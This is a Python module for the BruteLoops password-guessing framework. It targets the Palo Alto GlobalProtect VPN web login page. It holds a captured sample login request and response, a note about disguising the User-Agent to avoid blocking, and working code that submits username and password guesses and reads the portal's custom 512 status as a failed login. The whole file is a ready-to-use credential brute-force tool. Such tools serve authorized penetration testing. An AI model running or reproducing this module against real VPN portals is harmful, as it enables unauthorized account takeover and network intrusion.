#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search,match,compile
import requests
from BruteLoops.example.module import Module as BLModule


'''
# SAMPLE REQUEST

--------------------------------------------------------------------------------
POST /global-protect/login.esp HTTP/1.1
Host: x.x.x.x.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://64.3.140.242/global-protect/login.esp
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Cookie: PHPSESSID=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Connection: close
Upgrade-Insecure-Requests: 1



prot=https%3A&server=x.x.x.x&inputStr=&action=getsoftware&user=secretusername&passwd=secretpassword&ok=Log+In
--------------------------------------------------------------------------------

## Notes

- Requests UA must be changed to something innocuous
- Requires 'Content-Type: application/x-www-form-urlencoded'
- Requires real cookies from get request of same resource

# SAMPLE RESPONSE

--------------------------------------------------------------------------------
HTTP/1.1 512 Custom error
Date: Fri, 05 Apr 2019 17:25:47 GMT
Content-Type: text/html
Content-Length: 8450
Connection: close
ETag: "6f7fa-47a8-5c6247db"
Pragma: no-cache
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
x-private-pan-globalprotect: auth-failed
Expires: Thu, 19 Nov 1981 08:52:00 GMT
X-FRAME-OPTIONS: DENY
Set-Cookie: PHPSESSID=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; path=/; secure; HttpOnly
--------------------------------------------------------------------------------

## Notes

- Custom status code
- Custom header: x-private-pan-globalprotect
'''

url_re = compile(
    '^(?P<prot>https?:)//(?P<server>.+?)(?P<port>:[1-9]{1}[0-9]{,4})?/'
)

class Module(BLModule):
    '''
    Palo Alto Global Protect login example

    url parameter should be the full path to the post resource, such as:
        https://sub.domain.com/global-protect/login.esp. I've left this
    flexible to compensate for any changes in the URL scheme due to unique
    configurations.
    '''

    name = 'http.global_protect'
    description = brief_description = 'Global Protect web interface'

    def __init__(self, url:'required:True,type:str,help:URL to target',
            proxies:'required:False,type:str,help:HTTP proxies'={},
            headers:'required:False,type:str,help:HTTP headers'={},
            verify_ssl:'required:False,type:bool,help:Verify SSL'=False):

        m = match(url_re,url)

        assert m, 'Invalid URL provided'
        assert m['prot'], 'No protocol extracted from url; use full URL with scheme'
        assert m['server'], 'No server extracted; check url'

        # Extract POST information
        groups = m.groupdict()
        self.prot = groups['prot']
        self.server = groups['server']
        
        # Global Protect will block requests when the UA is Requests because security
        if not 'User-Agent' in headers:
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT x.y; WOW64; '\
                'rv:10.0) Gecko/20100101 Firefox/10.0'

        # Global Protect requires a specific Content-Type header
        if not 'Content-Type' in headers:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        self.url = url
        self.proxies = proxies
        self.headers = headers
        self.verify_ssl = verify_ssl

    def __call__(self,username,password,*args,**kwargs):

        sess = requests.Session()

        # CRAFT THE POST DATA
        data = {
            'prot':self.prot,
            'server':self.server,
            'inputStr':'',
            'action':'getsoftware',
            'user':username,
            'passwd':password,
            'ok':'Log In',
        }

        # get some cookies
        sess.get(self.url, 
            headers=self.headers,
            verify=self.verify_ssl,
            proxies=self.proxies)
    
        # make the request
        resp = sess.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)
    
        # verify credentials and return outcome
        if resp.status_code == 512:
            return (0, username, password,)
        else:
            return (1, username, password,)
